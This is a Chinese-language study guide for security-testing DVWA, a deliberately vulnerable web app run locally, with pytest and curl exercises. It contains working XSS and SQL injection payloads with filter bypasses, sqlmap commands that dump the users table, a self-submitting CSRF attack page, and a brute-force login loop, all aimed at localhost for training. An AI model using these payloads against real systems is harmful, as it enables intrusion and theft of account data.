# Phase 1 学习指南: DVWA 安全测试

## 学习目标

通过 DVWA (Damn Vulnerable Web Application) 靶机学习和验证 Web 应用的常见安全漏洞，掌握：
- OWASP Top 10 漏洞理解
- XSS (跨站脚本) 攻击与测试
- SQL 注入攻击与测试
- CSRF (跨站请求伪造) 测试
- 认证安全测试
- 安全头检查

---

## 1. 环境准备

### 启动靶机环境

```bash
# 进入项目目录
cd /Users/michaelzhou/Documents/github/michael-zhou-qa-portfolio/security-testing-demo

# 启动 Docker 环境
docker compose -f docker/docker-compose.yml up -d

# 验证 DVWA 运行
curl -I http://localhost
```

### 初始化 DVWA 数据库

1. 访问 http://localhost/setup.php
2. 点击 "Create / Reset Database"
3. 等待初始化完成

### 登录 DVWA

- URL: http://localhost/login.php
- 用户名: `admin`
- 密码: `password`

### 设置安全等级

1. 登录后访问 http://localhost/security.php
2. 将 Security Level 设置为 **Low**
3. 点击 Submit

### 运行测试

```bash
# 运行所有 DVWA 测试
python3 -m pytest tests/test_xss.py tests/test_sqli.py tests/test_csrf.py tests/test_auth.py tests/test_headers.py -v

# 运行单个测试文件
python3 -m pytest tests/test_xss.py -v

# 运行带详细输出
python3 -m pytest tests/test_sqli.py -v -s
```

---

## 2. XSS 漏洞测试 (test_xss.py)

### 学习要点

| 漏洞类型 | OWASP ID | 描述 |
|----------|----------|------|
| 反射型 XSS | A03 | 恶意脚本通过 URL 参数注入并立即执行 |
| 存储型 XSS | A03 | 恶意脚本存储在服务器并在访问时执行 |
| DOM XSS | A03 | 在客户端 JavaScript 中执行恶意脚本 |

### XSS Payload 列表

```javascript
// 基础 Payload
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')

// 绕过过滤器
<ScRiPt>alert('XSS')</ScRiPt>              // 大小写混合
<img src=x onerror='alert(String.fromCharCode(88,83,83))'>  // 字符编码
<svg/onload=alert('XSS')>                   // 无空格
```

### 手动验证练习

#### 练习 1: 反射型 XSS

```bash
# 访问 DVWA XSS (Reflected) 页面
curl "http://localhost/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low"

# 检查响应中是否包含未编码的 payload
# 漏洞: 返回 <script>alert('XSS')</script>
# 安全: 返回 &lt;script&gt;alert('XSS')&lt;/script&gt;
```

#### 练习 2: 存储型 XSS

```bash
# 访问 DVWA XSS (Stored) 页面 - 留言板
# URL: http://localhost/vulnerabilities/xss_s/

# 提交恶意留言
curl -X POST "http://localhost/vulnerabilities/xss_s/" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low" \
  -d "txtName=TestUser&mtxMessage=<script>alert('StoredXSS')</script>&btnSign=Sign+Guestbook"

# 刷新页面检查 payload 是否被存储和执行
```

#### 练习 3: DOM XSS 检测

```bash
# 检查页面中的危险模式
curl http://localhost/vulnerabilities/xss_d/ \
  -b "PHPSESSID=<YOUR_SESSION>; security=low" | grep -E "document.write|innerHTML|eval\("

# 危险模式包括:
# - document.write()
# - innerHTML
# - location.hash
# - eval()
```

### 测试结果解读

| 状态 | 含义 |
|------|------|
| Payload 被原样返回 | XSS 漏洞存在 |
| Payload 被 HTML 编码 | 应用进行了基本防护 |
| Payload 被过滤/移除 | 应用实施了过滤器 |

---

## 3. SQL 注入测试 (test_sqli.py)

### 学习要点

| 注入类型 | 描述 | 检测方法 |
|----------|------|----------|
| 错误型注入 | 通过错误信息泄露数据 | 检查 SQL 错误 |
| Union 注入 | 使用 UNION 合并查询 | 返回额外数据 |
| 布尔盲注 | 通过真/假条件差异 | 比较响应长度 |
| 时间盲注 | 通过响应时间差异 | 测量响应延迟 |

### SQL 注入 Payload 列表

```sql
-- 错误型
'
''
1'

-- 认证绕过
' OR '1'='1
' OR '1'='1'--
admin'--

-- Union 注入
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT user(),database()--
1' UNION SELECT table_name,NULL FROM information_schema.tables--

-- 时间盲注
1' AND SLEEP(3)--
1' AND (SELECT SLEEP(3))--
1'; WAITFOR DELAY '00:00:03'--  (SQL Server)

-- 布尔盲注
1' AND '1'='1
1' AND '1'='2
```

### 手动验证练习

#### 练习 1: 错误型注入

```bash
# 访问 DVWA SQL Injection 页面
curl "http://localhost/vulnerabilities/sqli/?id='&Submit=Submit" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low"

# 检查响应中的 SQL 错误:
# - "SQL syntax"
# - "mysql_"
# - "You have an error in your SQL syntax"
```

#### 练习 2: Union 注入

```bash
# 步骤 1: 确定列数
curl "http://localhost/vulnerabilities/sqli/?id=1'+UNION+SELECT+NULL,NULL--&Submit=Submit" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low"

# 步骤 2: 获取数据库信息
curl "http://localhost/vulnerabilities/sqli/?id=1'+UNION+SELECT+user(),database()--&Submit=Submit" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low"

# 步骤 3: 获取表名
curl "http://localhost/vulnerabilities/sqli/?id=1'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema=database()--&Submit=Submit" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low"
```

#### 练习 3: 布尔盲注

```bash
# 访问 DVWA SQL Injection (Blind) 页面

# 真条件 - 应返回正常响应
curl "http://localhost/vulnerabilities/sqli_blind/?id=1'+AND+'1'='1&Submit=Submit" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low"

# 假条件 - 应返回不同响应
curl "http://localhost/vulnerabilities/sqli_blind/?id=1'+AND+'1'='2&Submit=Submit" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low"

# 比较两个响应的长度差异
```

#### 练习 4: 时间盲注

```bash
# 测量基线响应时间
time curl "http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low"

# 测试时间注入 (应延迟 3 秒)
time curl "http://localhost/vulnerabilities/sqli_blind/?id=1'+AND+SLEEP(3)--&Submit=Submit" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low"
```

### sqlmap 简介

```bash
# 安装 sqlmap
brew install sqlmap

# 基础扫描
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<YOUR_SESSION>; security=low"

# 获取数据库信息
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<YOUR_SESSION>; security=low" \
  --dbs

# 获取表数据
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<YOUR_SESSION>; security=low" \
  -D dvwa -T users --dump
```

---

## 4. CSRF 测试 (test_csrf.py)

### 学习要点

| 防护机制 | 描述 | 检测方法 |
|----------|------|----------|
| CSRF Token | 每个请求携带唯一令牌 | 检查表单隐藏字段 |
| Referer 验证 | 验证请求来源 | 测试外部 Referer |
| SameSite Cookie | 限制跨站 Cookie 发送 | 检查 Cookie 属性 |

### CSRF Token 名称

```
csrf_token
user_token
_token
authenticity_token
csrfmiddlewaretoken
X-CSRF-TOKEN
```

### 手动验证练习

#### 练习 1: 检查 CSRF Token

```bash
# 访问 DVWA CSRF 页面 (修改密码)
curl "http://localhost/vulnerabilities/csrf/" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low" | grep -E "user_token|csrf|token"

# 检查是否存在 CSRF token 隐藏字段
```

#### 练习 2: CSRF Token 验证测试

```bash
# 尝试不带有效 token 修改密码
curl -X POST "http://localhost/vulnerabilities/csrf/" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low" \
  -d "password_new=hacked123&password_conf=hacked123&Change=Change&user_token=invalid_token"

# 漏洞: 响应包含 "Password Changed"
# 安全: 请求被拒绝
```

#### 练习 3: SameSite Cookie 检查

```bash
# 检查 Cookie 属性
curl -I http://localhost/login.php

# 查找 Set-Cookie 头中的 SameSite 属性:
# - SameSite=Strict  (最佳保护)
# - SameSite=Lax     (默认保护)
# - SameSite=None    (需要 Secure 标志)
# - 无 SameSite      (可能存在 CSRF 风险)
```

### CSRF 攻击演示 HTML

```html
<!-- 保存为 csrf_attack.html 并在浏览器中打开 -->
<html>
<body>
  <h1>恶意网站</h1>
  <form action="http://localhost/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="hacked" />
    <input type="hidden" name="password_conf" value="hacked" />
    <input type="hidden" name="Change" value="Change" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

---

## 5. 认证安全测试 (test_auth.py)

### 学习要点

| 漏洞类型 | OWASP ID | 描述 |
|----------|----------|------|
| 暴力破解 | A07 | 无限次尝试登录 |
| Session 固定 | A07 | 登录后 Session ID 不变 |
| 弱密码策略 | A07 | 接受简单密码 |

### 手动验证练习

#### 练习 1: 暴力破解检测

```bash
# 连续发送多次错误登录请求
for i in {1..10}; do
  curl -X POST "http://localhost/login.php" \
    -d "username=admin&password=wrong$i&Login=Login" \
    -w "Attempt $i: %{http_code}\n" -o /dev/null -s
  sleep 0.5
done

# 观察:
# - 是否返回 429 Too Many Requests
# - 是否显示账户锁定消息
# - 是否有渐进式延迟
```

#### 练习 2: Session 固定测试

```bash
# 步骤 1: 获取登录前的 Session ID
curl -c cookies.txt http://localhost/login.php
cat cookies.txt | grep PHPSESSID

# 步骤 2: 登录
curl -b cookies.txt -c cookies.txt -X POST http://localhost/login.php \
  -d "username=admin&password=password&Login=Login"

# 步骤 3: 检查登录后的 Session ID
cat cookies.txt | grep PHPSESSID

# 比较两个 Session ID:
# 漏洞: Session ID 相同 (Session 固定)
# 安全: Session ID 不同 (已重新生成)
```

#### 练习 3: 弱密码策略测试

```bash
# 测试弱密码是否被接受
WEAK_PASSWORDS=("123" "password" "admin" "12345678")

for pass in "${WEAK_PASSWORDS[@]}"; do
  curl -X POST "http://localhost/vulnerabilities/csrf/" \
    -b "PHPSESSID=<YOUR_SESSION>; security=low" \
    -d "password_new=$pass&password_conf=$pass&Change=Change" \
    -w "Password '$pass': %{http_code}\n" -o /dev/null -s
done

# 漏洞: 弱密码被接受
# 安全: 弱密码被拒绝
```

### 认证安全最佳实践

| 机制 | 推荐配置 |
|------|----------|
| 登录锁定 | 3-5 次失败后锁定 15-30 分钟 |
| Session 超时 | 空闲超时 15-30 分钟，绝对超时 4-8 小时 |
| 密码策略 | 最少 8 字符，包含大小写、数字、特殊字符 |
| Session 重生成 | 登录后必须生成新 Session ID |

---

## 6. 安全头检查 (test_headers.py)

### 学习要点

| 安全头 | 描述 | 推荐值 |
|--------|------|--------|
| Strict-Transport-Security | 强制 HTTPS | `max-age=31536000; includeSubDomains` |
| X-Frame-Options | 防止点击劫持 | `DENY` 或 `SAMEORIGIN` |
| X-Content-Type-Options | 防止 MIME 嗅探 | `nosniff` |
| Content-Security-Policy | 控制资源加载 | `default-src 'self'` |
| Referrer-Policy | 控制 Referer 信息 | `strict-origin-when-cross-origin` |
| Permissions-Policy | 控制浏览器功能 | `geolocation=(), camera=()` |

### 手动验证练习

#### 练习 1: 完整安全头审计

```bash
# 获取所有响应头
curl -I http://localhost

# 逐个检查安全头
echo "=== Security Headers Audit ==="
curl -sI http://localhost | grep -iE "strict-transport|x-frame|x-content-type|content-security|referrer-policy|permissions-policy"
```

#### 练习 2: HSTS 检查

```bash
# 检查 HSTS 头
curl -sI http://localhost | grep -i "strict-transport-security"

# 验证 HSTS 配置:
# - max-age >= 31536000 (1 年)
# - includeSubDomains
# - preload (可选，用于 HSTS 预加载列表)
```

#### 练习 3: CSP 检查

```bash
# 检查 Content-Security-Policy
curl -sI http://localhost | grep -i "content-security-policy"

# 关键指令:
# - default-src: 默认源
# - script-src: 脚本源
# - style-src: 样式源
# - img-src: 图片源
# - connect-src: AJAX/WebSocket 目标

# 危险配置:
# - 'unsafe-inline': 允许内联脚本
# - 'unsafe-eval': 允许 eval()
```

#### 练习 4: 批量安全头检查脚本

```python
#!/usr/bin/env python3
"""安全头检查脚本"""
import requests

SECURITY_HEADERS = {
    "Strict-Transport-Security": "HSTS",
    "X-Frame-Options": "Clickjacking Protection",
    "X-Content-Type-Options": "MIME Sniffing Protection",
    "Content-Security-Policy": "CSP",
    "Referrer-Policy": "Referrer Control",
    "Permissions-Policy": "Feature Control",
}

url = "http://localhost"
response = requests.get(url)

print(f"=== Security Headers for {url} ===\n")
for header, description in SECURITY_HEADERS.items():
    value = response.headers.get(header, "MISSING")
    status = "[+]" if value != "MISSING" else "[-]"
    print(f"{status} {header}: {value}")
```

---

## 7. 测试结果分析

### 测试通过含义

| 状态 | 含义 | 说明 |
|------|------|------|
| PASSED | 安全检查通过 | 应用正确防御了攻击 |
| XFAIL | 预期失败 | 已知漏洞，文档记录 |
| SKIPPED | 跳过 | 前置条件不满足 |

### DVWA 不同安全级别

| 级别 | XSS | SQLi | CSRF | 说明 |
|------|-----|------|------|------|
| Low | 无防护 | 无防护 | 无 Token | 用于学习基础攻击 |
| Medium | 简单过滤 | 简单转义 | 弱 Token | 学习绕过技术 |
| High | 强过滤 | 参数化 | 强 Token | 学习高级绕过 |
| Impossible | 完全防护 | 完全防护 | 完全防护 | 参考安全实现 |

---

## 8. 学习检查清单

### 知识掌握

- [ ] 理解 XSS 三种类型的区别
- [ ] 理解 SQL 注入四种类型的检测方法
- [ ] 理解 CSRF 攻击原理和防护机制
- [ ] 理解认证安全的常见问题
- [ ] 理解各安全头的作用

### 实操技能

- [ ] 能使用 curl 手动测试 XSS
- [ ] 能构造 SQL 注入 Payload
- [ ] 能检测 CSRF Token 实现
- [ ] 能进行 Session 安全测试
- [ ] 能进行完整的安全头审计

### 工具使用

- [ ] 能使用 pytest 运行安全测试
- [ ] 能使用 sqlmap 进行自动化注入
- [ ] 能使用 curl 进行手动测试

---

## 9. 扩展学习

### OWASP 资源

- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

### DVWA 挑战

完成 DVWA 所有难度级别的挑战：

| 模块 | Low | Medium | High |
|------|-----|--------|------|
| XSS (Reflected) | ☐ | ☐ | ☐ |
| XSS (Stored) | ☐ | ☐ | ☐ |
| SQL Injection | ☐ | ☐ | ☐ |
| SQL Injection (Blind) | ☐ | ☐ | ☐ |
| CSRF | ☐ | ☐ | ☐ |
| Brute Force | ☐ | ☐ | ☐ |

### 相关工具

| 工具 | 用途 |
|------|------|
| sqlmap | SQL 注入自动化 |
| Burp Suite | Web 安全测试 |
| OWASP ZAP | 自动化扫描 |
| curl | 手动 HTTP 请求 |

---

## 10. 常见问题

### Q: DVWA 显示数据库错误怎么办？

```bash
# 访问 setup 页面重新初始化
curl http://localhost/setup.php

# 或重启容器
docker compose -f docker/docker-compose.yml restart dvwa
```

### Q: 如何获取 PHPSESSID？

```bash
# 方法 1: 使用 curl 保存 Cookie
curl -c cookies.txt http://localhost/login.php
curl -b cookies.txt -c cookies.txt -X POST http://localhost/login.php \
  -d "username=admin&password=password&Login=Login"
cat cookies.txt

# 方法 2: 从浏览器开发者工具复制
# F12 > Application > Cookies > PHPSESSID
```

### Q: 为什么测试没有检测到漏洞？

1. 检查 DVWA 安全级别是否设置为 Low
2. 检查是否已登录 DVWA
3. 检查 Session Cookie 是否有效
4. 查看测试输出的详细日志

### Q: 如何切换安全级别进行测试？

```bash
# 通过 curl 设置安全级别
curl -X POST "http://localhost/security.php" \
  -b "PHPSESSID=<YOUR_SESSION>" \
  -d "security=low&seclev_submit=Submit"

# 可选值: low, medium, high, impossible
```
